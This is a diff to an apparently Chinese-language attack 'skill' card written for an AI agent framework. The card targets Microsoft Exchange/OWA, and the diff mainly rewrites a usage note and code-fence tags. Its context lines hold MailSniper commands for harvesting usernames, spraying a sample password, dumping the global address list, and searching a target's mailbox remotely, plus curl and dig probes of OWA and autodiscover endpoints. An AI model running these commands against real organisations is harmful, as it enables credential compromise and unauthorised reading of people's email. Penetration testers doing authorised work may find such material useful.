@@ -4,7 +4,7 @@ description: 'Exchange/OWA攻击：MailSniper用户枚举+密码喷洒+全局地
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## Exchange / OWA 攻击
 
@@ -18,7 +18,7 @@ Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domain.local -Us
 Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList valid.txt -Password Summer2025!
 # 导出全局地址簿
 Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\user -Password pass -OutFile gal.txt
-```
+```text
 
 ### OWA 邮件读取
 ```bash
@@ -26,7 +26,7 @@ Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\user -Passw
 # URL: https://mail.domain.com/owa/
 # 或者用 MailSniper:
 Invoke-SelfSearch -Mailbox target@domain.com -ExchHostname mail.domain.com -Remote
-```
+```text
 
 ### 检测 OWA
 ```bash
@@ -36,7 +36,7 @@ dig autodiscover.domain.com
 # HTTPS 探测
 curl -k https://mail.domain.com/owa/
 curl -k https://autodiscover.domain.com/autodiscover/autodiscover.xml
-```
+```text
 
 ### 常见 Exchange 端口
 - 443 (OWA/EWS/ECP)
